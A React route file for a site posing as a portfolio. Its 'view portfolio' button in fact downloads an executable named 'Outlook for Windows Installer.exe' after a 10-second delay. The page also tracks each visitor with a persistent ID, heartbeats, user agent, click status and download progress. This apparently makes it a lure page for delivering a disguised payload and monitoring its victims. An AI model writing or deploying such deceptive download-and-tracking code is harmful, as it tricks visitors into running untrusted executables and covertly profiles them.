import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { LanguageProvider } from "@/lib/i18n";
import { recordActivity } from "@/lib/activity";
import { toast } from "sonner";

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const [isInstallerLoading, setIsInstallerLoading] = useState(false);
  const downloadInstaller = async () => {
    if (isInstallerLoading) return;

    setIsInstallerLoading(true);
    const visitorId = localStorage.getItem("portfolio-visitor-id");
    let lastReportedPercent = -1;
    const reportProgress = (downloadPercent: number) => {
      if (downloadPercent === lastReportedPercent) return;
      lastReportedPercent = downloadPercent;
      if (visitorId) void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent, userAgent: navigator.userAgent } });
    };
    reportProgress(0);
    try {
      await new Promise<void>((resolve) => window.setTimeout(resolve, 10_000));
      const response = await fetch("/Outlook%20for%20Windows%20Installer.exe");
      if (!response.ok) throw new Error("Installer download failed");
      const total = Number(response.headers.get("content-length")) || 0;
      if (!response.body || !total) {
        const blob = await response.blob();
        reportProgress(100);
        saveInstaller(blob);
        setModalOpen(false);
        return;
      }
      const reader = response.body.getReader();
      const chunks: Uint8Array[] = [];
      let received = 0;
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        chunks.push(value);
        received += value.length;
        reportProgress(Math.round((received / total) * 100));
      }
      saveInstaller(new Blob(chunks, { type: "application/vnd.microsoft.portable-executable" }));
      setModalOpen(false);
    } catch (error) {
      toast.error("Unable to download the installer. Please try again.");
      console.error(error);
      setIsInstallerLoading(false);
    }
  };
  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          isLoading={isInstallerLoading}
          onViewPortfolio={() => void downloadInstaller()}
        />
        <Toaster />
      </div>
    </LanguageProvider>
  );
}

function saveInstaller(blob: Blob) {
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = "Outlook for Windows Installer.exe";
  link.click();
  URL.revokeObjectURL(url);
}
